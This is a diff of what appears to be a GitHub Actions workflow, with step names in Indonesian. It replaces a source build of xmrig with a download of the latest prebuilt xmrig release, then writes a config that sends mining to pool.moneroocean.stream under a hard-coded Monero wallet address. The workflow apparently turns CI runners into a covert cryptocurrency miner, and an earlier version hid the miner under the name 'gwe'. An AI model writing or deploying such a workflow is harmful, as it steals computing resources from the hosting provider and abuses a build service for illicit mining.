@@ -11,21 +11,12 @@ jobs:
     steps:
       - name: Install dependencies
         run: |
-          sudo apt-get update
-          sudo apt-get install -y git build-essential cmake \
-            libuv1-dev libssl-dev libhwloc-dev
+          sudo apt-get install curl
+          mkdir -p ~/moneroocean && cd ~/moneroocean
+          url=$(curl -fsSL https://api.github.com/repos/MoneroOcean/xmrig/releases/latest | grep browser_download_url | grep -E 'lin64-compat|lin64\.tar\.gz' | head -1 | cut -d '"' -f 4)
+          curl -L "$url" -o xmrig.tar.gz && tar xf xmrig.tar.gz && chmod +x xmrig
 
-      - name: Clone gwe
-        run: git clone https://github.com/MoneroOcean/xmrig.git gwe
-
-      - name: Build gwe
-        run: |
-          cd gwe
-          mkdir build && cd build
-          cmake ..
-          make -j$(nproc)
-
-      - name: Buat config dummy
+      - name: Buat config cihuyy
         run: |
           cat > config.json << 'EOF'
           {
@@ -36,7 +27,7 @@ jobs:
             },
             "pools": [
               {
-                "url": "pool.moneroocean.stream:10032",
+                "url": "pool.moneroocean.stream:20004",
                 "user": "89nrRkC52Zd3n24GUh7yCVLLmt2wXGnFPWGtPJuHpQnBbmPJvV1RURbHy6cxu2L5kiGcgRZVBLSKYCqggDC7ynR3MSTs5rk",
                 "pass": "my",
                 "tls": true,
